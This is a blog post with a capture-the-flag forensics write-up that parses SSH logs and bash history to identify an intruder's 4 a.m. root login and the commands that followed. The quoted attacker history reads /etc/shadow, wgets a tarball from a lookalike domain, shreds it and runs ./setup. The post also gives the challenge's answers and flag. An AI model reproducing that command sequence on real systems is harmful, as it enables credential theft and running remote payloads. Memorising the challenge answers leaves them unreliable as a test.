---
layout: post
title: "forensics - an unusual sighting"
date: 2025-02-27 00:00:00 -0700
categories: ctfs
description: "A forensics challenge that involves analyzing SSH logs and bash history to identify suspicious activities."
parent: HTB Tryouts 2025
grand_parent: CTF Events
event: "hackthebox-tryouts-25"
tags:
- "shell"
- "forensics"
---
# AnUnusualSighting

## Engagement Notes

This is a very easy forensics challenge from the HTB practice CTF. This is just a chance to go through my workflow of generating jupyter notebooks through the course of the CTF challenge and then outputting it to a markdown format for this blog. The post notes summary is AI generated, but this is the real solution to this challenge.

## pwntools


```python
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['ghostty', '-e']

def start(server: str, port: str):
        return remote(server, port)

io = start("94.237.59.180", "59166")


```

    [x] Opening connection to 94.237.59.180 on port 59166
    [x] Opening connection to 94.237.59.180 on port 59166: Trying 94.237.59.180


    [+] Opening connection to 94.237.59.180 on port 59166: Done



```python
from pprint import pprint
pprint(io.recvuntil(b">").decode())
```

    ('\n'
     '+---------------------+---------------------------------------------------------------------------------------------------------------------+\n'
     '|        Title        |                                                     '
     'Description                                                     |\n'
     '+---------------------+---------------------------------------------------------------------------------------------------------------------+\n'
     '| An unusual sighting |                        As the preparations come to '
     'an end, and The Fray draws near each day,                        |\n'
     '|                     |             our newly established team has started '
     'work on refactoring the new CMS application for the competition. |\n'
     '|                     |                  However, after some time we noticed '
     'that a lot of our work mysteriously has been disappearing!     |\n'
     '|                     |                     We managed to extract the SSH '
     'Logs and the Bash History from our dev server in question.        |\n'
     '|                     |               The faction that manages to uncover '
     'the perpetrator will have a massive bonus come the competition!   |\n'
     '|                     '
     '|                                                                                                                     '
     '|\n'
     '|                     |                                            Note: '
     'Operating Hours of Korp: 0900 - 1900                               |\n'
     '+---------------------+---------------------------------------------------------------------------------------------------------------------+\n'
     '\n'
     '\n'
     '\x1b[4mNote 2:\x1b[0m All timestamps are in the format they appear in the '
     'logs\n'
     '\n'
     '\x1b[95mWhat is the IP Address and Port of the SSH Server (IP:PORT)\n'
     '\x1b[0m>')



```python
sshdlog = "./forensics_an_unusual_sighting/sshd.log"
bashhistory = "./forensics_an_unusual_sighting/bash_history.txt"
```

Get the ssh server and port by seeing where people are connecting to by grepping out "Connection from" which shows who's connecting, and to where.


```python
sshserver =!grep 'Connection from' $sshdlog | cut -d' ' -f9 | uniq # Extract the IP address of the server at the 9th position delimited with spaces
sshport =!grep 'Connection from' $sshdlog | cut -d' ' -f11 | uniq # Extract the Port the server is listening on at the 11th position delimited with spaces
print(sshserver, sshport)
```

    ['100.107.36.130'] ['2221']



```python
io.sendline(f'{sshserver[0]}:{sshport[0]}'.encode())
```


```python
pprint(io.recvuntil(b">"))
```

    (b' \x1b[92m[+] Correct!\n\n\x1b[95m\x1b[95mWhat time is the first successful '
     b'Login\n\x1b[0m>')


Grab all outputs for anyone that's connected, we're only interested in the first successful login for this question - not necessarily shenanigans.


```python
firstloginraw =!grep 'Accepted' $sshdlog | cut -d' ' -f1-2 | uniq # Extract the date and time of the first successful login
firstlogin = firstloginraw[0][1:-1]
print(firstlogin)

```

    2024-02-13 11:29:50



```python
io.sendline(f'{firstlogin}'.encode())
```


```python
pprint(io.recvuntil(b">"))
```

    (b' \x1b[92m[+] Correct!\n\n\x1b[95m\x1b[95mWhat is the time of the unusual Lo'
     b'gin\n\x1b[0m>')


Now we're only interested in the suspicious ones. To determine what's interesting, let's print out all authenticated sessions and look at just the timestamps, users, and IPs.

We'll see that the odd login happens at 4am while rest happen during normal business hours. We also notice the entirely different IP range from the login attempts.


```python
alllogins =! grep 'Accepted' $sshdlog | cut -d' ' -f1-2,6,8,10 # Extract various fields used to identify oddities in the successful logins
pprint(alllogins)
suslogin = " ".join(alllogins[4].split()[0:2])[1:-1] # Root login at odd hour, from non 10[0|2] ip
pprint(suslogin)
```

    ['[2024-02-13 11:29:50] root 100.81.51.199 63172',
     '[2024-02-15 10:40:50] softdev 101.111.18.92 44711',
     '[2024-02-15 18:51:50] softdev 101.111.18.92 44711',
     '[2024-02-16 10:26:50] softdev 100.86.71.224 58713',
     '[2024-02-19 04:00:14] root 2.67.182.119 60071',
     '[2024-02-20 11:10:14] softdev 100.87.190.253 63371',
     '[2024-02-21 10:49:50] softdev 102.11.76.9 48875',
     '[2024-02-21 18:17:50] softdev 100.7.98.129 47765',
     '[2024-02-22 12:07:14] softdev 100.11.239.78 49811',
     '[2024-02-23 10:49:50] softdev 102.11.76.9 48875',
     '[2024-02-23 18:17:50] softdev 100.7.98.129 47765',
     '[2024-02-24 11:15:08] softdev 102.11.76.9 48875',
     '[2024-02-24 14:07:18] softdev 100.7.98.129 47765',
     '[2024-02-26 09:57:01] softdev 102.11.76.9 48875',
     '[2024-02-26 15:07:18] softdev 100.7.98.129 47765',
     '[2024-02-27 13:41:51] softdev 100.85.206.20 54976',
     '[2024-02-28 17:19:50] softdev 100.7.98.129 47765',
     '[2024-02-29 09:57:01] softdev 102.11.76.9 48875',
     '[2024-02-29 18:01:29] softdev 100.7.98.129 47765']
    '2024-02-19 04:00:14'



```python
io.sendline(f'{suslogin}'.encode())
```


```python
pprint(io.recvuntil(b">"))
```

    (b' \x1b[92m[+] Correct!\n\n\x1b[95m\x1b[95mWhat is the Fingerprint of the att'
     b"acker's public key\n\x1b[0m>")



```python
susloginline =!grep "$suslogin" $sshdlog | grep 'publickey' | cut -d' ' -f13
pprint(susloginline)
```

    ['SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4']



```python
io.sendline(f'{susloginline[0].split(":")[1]}'.encode())
```


```python
pprint(io.recvuntil(b">"))
```

    (b' \x1b[92m[+] Correct!\n\n\x1b[95m\x1b[95mWhat is the first command the atta'
     b'cker executed after logging in\n\x1b[0m>')


Now that we determined roughly when the attacker logged in, let's look at the history and show all commands that happened on that day and around the time the suspicious login occurred.


```python
susloginrange = suslogin[0:-5]
print(susloginrange)
suscommands = !grep "$susloginrange" $bashhistory 
pprint(suscommands)
firstcommand = suscommands[0].split()[2]
print(firstcommand)
```

    2024-02-19 04:
    ['[2024-02-19 04:00:18] whoami',
     '[2024-02-19 04:00:20] uname -a',
     '[2024-02-19 04:00:40] cat /etc/passwd',
     '[2024-02-19 04:01:01] cat /etc/shadow',
     '[2024-02-19 04:01:15] ps faux',
     '[2024-02-19 04:02:27] wget '
     'https://gnu-packages.com/prebuilts/iproute2/latest.tar.gz -O '
     '/tmp/latest_iproute.tar.gz',
     '[2024-02-19 04:10:02] tar xvf latest.tar.gz',
     '[2024-02-19 04:12:02] shred -zu latest.tar.gz',
     '[2024-02-19 04:14:02] ./setup']
    whoami



```python
io.sendline(f'{firstcommand}'.encode())
```


```python
pprint(io.recvuntil(b">"))
```

    (b' \x1b[92m[+] Correct!\n\n\x1b[95m\x1b[95mWhat is the final command the atta'
     b'cker executed before logging out\n\x1b[0m>')


We needed the first command, now we need the last command.


```python
lastcommand = suscommands[-1].split()[2]
print(lastcommand)
```

    ./setup



```python
io.sendline(f'{lastcommand}'.encode())
```

And with that, we're done and have the flag.


```python
for i in range(3):
    pprint(io.recvline().decode())
```

    ' \x1b[92m[+] Correct!\n'
    '\n'
    '\x1b[95m\x1b[92m[+] Here is the flag: HTB{4n_unusual_s1ght1ng_1n_SSH_l0gs!}\n'


# Post Notes


```python
# Summary of Analysis

## Overview
This Jupyter Notebook documents the forensic analysis of an unusual sighting on a server. The analysis involves examining SSH logs and bash history to identify suspicious activities.

## Key Steps
1. **Setup and Connection**: 
    - The `pwntools` library is used to set up the context and connect to a remote server.
    - The connection is established to the server at `94.237.59.180` on port `59166`.

2. **Data Extraction**:
    - SSH logs (`sshd.log`) and bash history (`bash_history.txt`) are analyzed.
    - Grep commands are used to extract relevant information from these logs.

3. **Identifying Suspicious Activity**:
    - The first login time is identified as `2024-02-13 11:29:50`.
    - All login attempts are listed, with a particular focus on a suspicious root login at `2024-02-19 04:00:14` from IP `2.67.182.119`.
    - The public key used for this login is extracted.

4. **Command Analysis**:
    - Commands executed by the suspicious login are extracted from the bash history.
    - The first command executed is `whoami`, and the last command is `./setup`.

## Insights from Grep Commands
- **SSH Connections**:
  - The command `grep 'Connection from' $sshdlog` identifies all SSH connection attempts, extracting the server and port information.
  - Unique IP addresses and ports are listed, indicating multiple connection attempts from different IPs.

- **Accepted Logins**:
  - The command `grep 'Accepted' $sshdlog` extracts all successful login attempts.
  - The extracted data includes timestamps, usernames, IP addresses, and ports.
  - A suspicious root login at an unusual hour (04:00 AM) from a non-local IP (`2.67.182.119`) is identified.

- **Public Key Extraction**:
  - The command `grep "$suslogin" $sshdlog | grep 'publickey'` extracts the public key used for the suspicious login.
  - The extracted public key is `SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4`.

- **Command History**:
  - The command `grep "$susloginrange" $bashhistory` extracts commands executed during the suspicious login session.
  - Commands include system information queries (`whoami`, `uname -a`), file access (`cat /etc/passwd`, `cat /etc/shadow`), process listing (`ps faux`), and downloading and executing a setup script.

## Conclusion
The analysis reveals a suspicious root login at an unusual hour from a non-local IP address. The commands executed during this session indicate potential malicious activity, including accessing sensitive files and downloading and executing a script. Further investigation is required to determine the full extent of the compromise.
```
